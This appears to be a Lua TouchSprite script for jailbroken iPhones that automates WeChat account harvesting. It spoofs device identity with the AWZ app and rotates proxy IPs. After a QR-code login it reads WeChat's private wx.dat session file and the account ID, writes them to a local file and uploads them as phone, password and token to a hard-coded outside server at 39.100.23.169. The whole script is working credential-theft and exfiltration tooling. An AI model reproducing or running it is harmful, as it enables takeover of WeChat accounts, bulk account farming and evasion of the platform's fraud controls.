require "TSLib"
local ts 				= require('ts')
local json 				= ts.json

local model 				= {}

model.awz_bid 			= "AWZ"
model.wc_bid 			= "com.tencent.xin"

function model:clear_App()
	::run_again::
	closeApp(self.awz_bid)
	mSleep(math.random(200, 500))
	runApp(self.awz_bid)
	mSleep(math.random(500, 1500))

	while true do
		mSleep(500)
		flag = isFrontApp(self.awz_bid)
		if flag == 1 then
			if getColor(147,456) == 0x6f7179 then
				break
			end
		else
			goto run_again
		end
	end

	::new_phone::
	local sz = require("sz");
	local http = require("szocket.http")
	local res, code = http.request("http://127.0.0.1:1688/cmd?fun=newrecord")
	if code == 200 then
		local resJson = sz.json.decode(res)
		local result = resJson.result
		if result == 3 then
			toast("新机成功，不过ip重复了",1)
			mSleep(1000)
		elseif result == 1 then
			toast("成功",1)
		else 
			toast("失败，请手动查看问题", 1)
			mSleep(4000)
			goto new_phone
		end
	end
end

--下面是子程序
function model:change_IP(content_user,content_country)--换IP
	while true do
		::change_ip::
		mSleep(500)
		status_resp, header_resp,body_resp = ts.httpGet("http://refresh.rola-ip.site/refresh?user="..content_user.."&country="..content_country)
		if status_resp == 200 then
			tmp = json.decode(body_resp)
			if tmp.Ret == "SUCCESS" then
				toast("切换成功",1)
				mSleep(1000)
				break
			elseif tmp.Ret == "PARAM_ERROR" then
				toast("切换失败",1)
				mSleep(3000)
				goto change_ip
			end
		else
			toast("切换失败",1)
			mSleep(2000)
			goto change_ip
		end
	
		if (status_resp==502) then--打开网站失败
			toast("打开网站失败等待3秒")
			mSleep(3000)
		end
	end
end

function model:wechat()
	closeApp(self.wc_bid)
	mSleep(math.random(1000, 1500))
	runApp(self.wc_bid)
	mSleep(math.random(1000, 1500))
	while (true) do
		mSleep(500)
		if getColor(69,  981) == 0x1a1a1a then
			mSleep(500)
			randomsTap(369, 981, 5)
			mSleep(500)
			break
		end
	end


	wait = 0
	while (true) do
		mSleep(500)
		if getColor(93, 1256) == 0x036030 and getColor(535,  889) == 0x576b95 or getColor(362,825) == 0x576b95 and getColor(89,1258) == 0x36030 then
			mSleep(500)
			toast("登陆成功，准备提取数据",1)
			mSleep(500)
			return true
		end
		
		mSleep(500)
		if getColor(232,  430) ==  0x000000 then
			mSleep(500)
			toast("等待扫码",1)
			mSleep(5000)
		end
		
		mSleep(500)
		if getColor(295,  656) == 0x757578 and getColor(441,  703) == 0x7f7f7f then
			mSleep(500)
			toast("登陆中,超过30次退出重新进,当前次数:"..wait,1)
			mSleep(2000)
			wait = wait + 1
		end
		
		if wait > 30 then
			mSleep(500)
			setAirplaneMode(true);    --打开飞行模式
			mSleep(1000)
			closeApp(self.wc_bid)
			mSleep(math.random(1000, 1500))	
			setAirplaneMode(false);    --关闭飞行模式
			mSleep(5000)
			runApp(self.wc_bid)
			mSleep(math.random(1000, 1500))
			wait = 0
		end
		
		mSleep(500)
		if getColor(385,  463) == 0x18aa48 or getColor(384,  496) == 0x18aa48 then
			mSleep(500)
			randomsTap(385,  463, 5)
			mSleep(2000)
			toast("二维码失效",1)
			mSleep(5000)
		end
	end
end

function model:write_data(inifile,key)
	F=io.open(userPath().."/res/"..inifile,"a")
	F:write(key,'\n')
	F:close()
end

function model:getData() --获取62数据 (可以用的)
	local getList = function(path) 
		local a = io.popen("ls "..path) 
		local f = {}; 
		for l in a:lines() do 
			table.insert(f,l) 
		end 
		return f 
	end 
	local Wildcard = getList("/var/mobile/Containers/Data/Application") 
	for var = 1,#Wildcard do 
		local file = io.open("/var/mobile/Containers/Data/Application/"..Wildcard[var].."/Library/WechatPrivate/wx.dat","rb") 
		if file then 
			local ts = require("ts")
			local plist = ts.plist
			local plfilename = "/var/mobile/Containers/Data/Application/"..Wildcard[var].."/Library/LocalInfo.lst" --设置plist路径
			local tmp2 = plist.read(plfilename)                --读取 PLIST 文件内容并返回一个 TABLE
			for k, v in pairs(tmp2) do
				if k == "$objects" then
					for i = 11 ,12 do
						if tonumber(v[i]) then
							wx = v[i]
							break
						end	 
					end	
				end	
			end	
			local str = file:read("*a") 
			file:close() 
			require"sz" 
			local str = string.tohex(str) --16进制编码 
			return str 
		end 
	end 
end 

function model:main()
	local w,h = getScreenSize()
	MyTable = {
		["style"] = "default",
		["width"] = w,
		["height"] = h,
		["config"] = "save_001.dat",
		["timer"] = 100,
		views = {
			{
				["type"] = "Label",
				["text"] = "提取数据脚本",
				["size"] = 30,
				["align"] = "center",
				["color"] = "255,0,0",
			},
			{
				["type"] = "Label",
				["text"] = "====================",
				["size"] = 20,
				["align"] = "center",
				["color"] = "255,0,0",
			},
			{
				["type"] = "Label",
				["text"] = "数据保存方式",
				["size"] = 20,
				["align"] = "center",
				["color"] = "0,0,255",
			},
			{
				["type"] = "RadioGroup",                    
				["list"] = "手机,手机+服务器",
				["select"] = "0",  
				["countperline"] = "4",
			},
			{
				["type"] = "Label",
				["text"] = "选择网络连接方式",
				["size"] = 20,
				["align"] = "center",
				["color"] = "0,0,255",
			},
			{
				["type"] = "RadioGroup",                    
				["list"] = "vpn,流量",
				["select"] = "0",  
				["countperline"] = "4",
			},
			{
				["type"] = "Label",
				["text"] = "网页切换ip账号",
				["size"] = 15,
				["align"] = "center",
				["color"] = "255,0,255",
			},
			{
				["type"] = "Edit",        
				["prompt"] = "请输入网页切换ip账号",
				["text"] = "默认值",       
			},
			{
				["type"] = "Label",
				["text"] = "网页切换ip国家代码",
				["size"] = 15,
				["align"] = "center",
				["color"] = "255,0,255",
			},
			{
				["type"] = "Edit",        
				["prompt"] = "请输入网页切换ip国家代码",
				["text"] = "默认值",       
			}
		}
	}

	local MyJsonString = json.encode(MyTable)

	ret, getData_type, content_type, content_user,content_country = showUI(MyJsonString)
	if ret == 0 then
		dialog("取消运行脚本", 3)
		luaExit()
	end 
	
	while (true) do
		setVPNEnable(false)
		self:clear_App()
		if content_type == "0" then
--			self:change_IP(content_user,content_country)
			setVPNEnable(true)
		end
	
		upload_data = self:wechat()
		if upload_data then
			six_data = self:getData()
			mSleep(500)
			wx = "00"..string.sub(wx,2,#wx)
			all_data = wx.."----aaaaqqqq----"..six_data
			toast(all_data,1)
			mSleep(1200)
			writeFileString(userPath().."/res/toIOSData.txt",all_data,"a",1)
--			self:write_data("toIOSData.txt",tostring(all_data))
			if getData_type == "1" then
				time = getNetTime()
				sj = os.date("%Y-%m-%d-%H-%M-%S",time)
				mSleep(200)
				
				::send::
				local sz = require("sz")       
				local http = require("szocket.http")
				local res, code = http.request("http://39.100.23.169/import_data?phone="..wx.."&password=aaaaqqqq&token="..six_data.."&is_normal=true&operator=toIOSData&link=null&time="..urlEncoder(sj))
				if code == 200 then
					tmp = json.decode(res)
					if tmp.code == 200 then
						toast(tmp.message,1)
						mSleep(4000)
					else
						toast("重新上传",1)
						mSleep(1000)
						goto send
					end
				else
					toast("重新上传",1)
					mSleep(1000)
					goto send
				end
			end
			mSleep(500)
			closeApp(self.wc_bid)
			mSleep(math.random(1000, 1500))
			setVPNEnable(false)
		end
	end
end

model:main()
